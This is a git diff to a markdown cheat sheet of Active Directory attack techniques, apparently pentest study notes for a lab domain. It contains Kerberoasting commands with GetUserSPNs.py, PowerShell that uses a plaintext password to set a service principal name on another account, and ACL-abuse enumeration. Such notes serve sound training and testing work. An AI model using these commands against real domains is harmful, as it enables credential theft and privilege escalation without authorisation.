@@ -151,8 +151,13 @@ Find Computers where Domain Users are Local Admin
 > [!NOTE]  
 > Requires domain user, cleartext password or hash, a shell in context of user or a shell in context of system. Must also know which host is domain controller so we can query it 
 **Kerberoasting**
-```sudo python3 -m pip install . ```
-```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev```
+```
+sudo python3 -m pip install .
+
+```
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
 ## Exploitation (from Windows )
 
 
@@ -172,7 +177,6 @@ tag:lateral-movement
 
 ```
 
-
 **Pillaging** 
 
 ```
@@ -186,13 +190,14 @@ $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
 Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
 ```
-## ACL Enumeration & Exploitation 
+## ACL
 ### ACL Rights & What They Mean 
+GenericRight - all possible access rights 
+GenericWrite - full write access
 ```
 Find-InterestingDomainACL
 ```
 
-**Generic Rights* 
 
 ### Changing User Password Based on ACL Information 
  [!NOTE]  
